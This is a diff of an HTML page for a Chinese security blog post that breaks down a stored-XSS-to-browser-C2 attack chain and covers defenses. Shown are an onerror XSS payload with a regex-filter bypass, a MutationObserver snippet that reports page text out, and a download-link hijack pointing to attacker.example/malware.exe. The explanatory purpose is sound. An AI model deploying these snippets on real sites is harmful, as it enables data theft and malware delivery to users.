@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="Wind">
 <meta property="og:description" content="存储型 XSS 的经典危害是弹个 alert(1)，实际上攻击者能做的远不止于此。本文拆解一条真实出现过的完整攻击链：一段存储型 XSS 触发后，在受害者浏览器里挂载了一个功能完整的 C2（Command &amp;amp; Control）框架，通过 WebSocket 持久化控制，支持远程推送任意 JS 插件、实时回传 Cookie 和 DOM 数据。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2026-05-22T01:15:17.202Z">
+<meta property="og:updated_time" content="2026-05-22T02:38:04.196Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Stored XSS 到浏览器 C2：攻击链拆解与防御">
 <meta name="twitter:description" content="存储型 XSS 的经典危害是弹个 alert(1)，实际上攻击者能做的远不止于此。本文拆解一条真实出现过的完整攻击链：一段存储型 XSS 触发后，在受害者浏览器里挂载了一个功能完整的 C2（Command &amp;amp; Control）框架，通过 WebSocket 持久化控制，支持远程推送任意 JS 插件、实时回传 Cookie 和 DOM 数据。">
@@ -216,7 +216,7 @@
 <p>直觉上 detached 节点是安全的——它没有挂载到文档里，不会显示出来。但这个直觉是错的：</p>
 <p><strong><code>innerHTML</code> 赋值时，浏览器会立即解析 HTML 并触发资源加载。<code>&lt;img src=x&gt;</code>、<code>&lt;video src=x&gt;</code> 在 detached 节点上同样会发起网络请求，失败后同样会触发 <code>onerror</code>。<code>onerror</code> 在赋值语句执行期间同步运行。</strong></p>
 <p>这意味着：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div.innerHTML = <span class="string">'&lt;video src="x" onerror="pwned()"&gt;'</span>;</span><br><span class="line"><span class="comment">// pwned() 在这一行执行完之前就已经被调用了</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div.innerHTML = <span class="string">'&lt;video src="x" onerror="pwned()"&gt;'</span>;</span><br><span class="line"><span class="comment">// pwned() 在赋值后很快被调用——浏览器异步触发 onerror，但通常在同一事件循环任务内完成</span></span><br></pre></td></tr></table></figure>
 <p>攻击载荷只需要是一个未闭合的 <code>&lt;video&gt;</code> 或 <code>&lt;img&gt;</code>（未闭合可以绕过只匹配 <code>&lt;video&gt;...&lt;/video&gt;</code> 的正则过滤），<code>onerror</code> 就会在&quot;纯文本提取&quot;的瞬间触发。</p>
 <h3 id="安全替代方案"><a href="#安全替代方案" class="headerlink" title="安全替代方案"></a>安全替代方案</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DOMParser 不触发资源加载，不执行事件处理器</span></span><br><span class="line"><span class="keyword">const</span> doc = <span class="keyword">new</span> DOMParser().parseFromString(htmlString, <span class="string">'text/html'</span>);</span><br><span class="line"><span class="keyword">const</span> text = doc.body.textContent || <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者：如果只需要剥离标签，纯正则就够，完全不过 DOM</span></span><br><span class="line"><span class="keyword">const</span> text = htmlString.replace(<span class="regexp">/&lt;[^&gt;]*&gt;/g</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure>
 <p><code>DOMParser</code> 解析出来的文档是惰性的，不会发起网络请求，也不会执行任何事件处理器。这是从 HTML 提取纯文本最安全的方式。</p>
@@ -296,7 +296,7 @@
 <p>用户在页面上复制一个钱包地址，粘贴出来的是攻击者的地址。这类攻击对加密货币转账场景尤其致命，受害者极少在粘贴后逐字核对。监听 <code>paste</code> 事件同样可以做：用户粘贴内容时替换掉。</p>
 <p><strong>DOM 监听 + 实时数据抓取</strong></p>
 <p>插件可以挂 <code>MutationObserver</code> 持续监听 DOM 变化，每当页面出现新内容就把感兴趣的节点文本回传——相当于一个持续运行的屏幕录制器，但只针对结构化数据：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> MutationObserver(<span class="function"><span class="params">mutations</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> m <span class="keyword">of</span> mutations) &#123;</span><br><span class="line">        <span class="keyword">const</span> text = m.target.textContent;</span><br><span class="line">        <span class="keyword">if</span> (looksInteresting(text)) report(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).observe(<span class="built_in">document</span>.body, &#123; <span class="attr">childList</span>: <span class="literal">true</span>, <span class="attr">subtree</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> MutationObserver(<span class="function"><span class="params">mutations</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> m <span class="keyword">of</span> mutations) &#123;</span><br><span class="line">        <span class="comment">// m.addedNodes 是本次新增的节点列表</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> node <span class="keyword">of</span> m.addedNodes) &#123;</span><br><span class="line">            <span class="keyword">const</span> text = node.textContent;</span><br><span class="line">            <span class="keyword">if</span> (looksInteresting(text)) report(text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).observe(<span class="built_in">document</span>.body, &#123; <span class="attr">childList</span>: <span class="literal">true</span>, <span class="attr">subtree</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure>
 <p>对于单页应用，用户在不同路由间切换、加载新数据时，Observer 都会持续触发，无需攻击者主动轮询。</p>
 <p><strong>下载链接劫持</strong></p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.querySelectorAll(<span class="string">'a[download]'</span>).forEach(<span class="function"><span class="params">a</span> =&gt;</span> &#123;</span><br><span class="line">    a.href = <span class="string">'https://attacker.example/malware.exe'</span>;</span><br><span class="line">    a.download = a.download || <span class="string">'update.exe'</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以用 MutationObserver 处理动态渲染出来的链接</span></span><br></pre></td></tr></table></figure>
@@ -482,6 +482,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2026/05/22/csp_best_practices/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Content Security Policy 最佳实践：从 allowlist 到 Strict CSP
+        
+      </div>
+    </a>
   
   
     <a href="/2026/05/01/caddy_letsencrypt_ip_cert/" id="article-nav-older" class="article-nav-link-wrap">
@@ -1156,6 +1165,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">c2</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">csp</a>
               </li>
             
             <div class="clearfix"></div>
